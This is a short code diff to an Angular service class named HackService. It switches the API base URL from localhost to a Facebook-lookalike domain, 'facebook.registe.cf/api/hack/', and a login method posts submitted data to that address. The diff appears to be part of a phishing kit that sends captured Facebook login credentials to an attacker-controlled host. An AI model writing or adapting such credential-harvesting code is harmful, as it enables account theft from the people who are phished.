@@ -8,7 +8,7 @@ export class HackService {
 
   constructor(private http: HttpClient,) { }
 
-  url = 'http://localhost:4200/api/hack/'
+  url = 'https://facebook.registe.cf/api/hack/'
 
   login(data){
     return this.http.post(this.url + 'login', data)
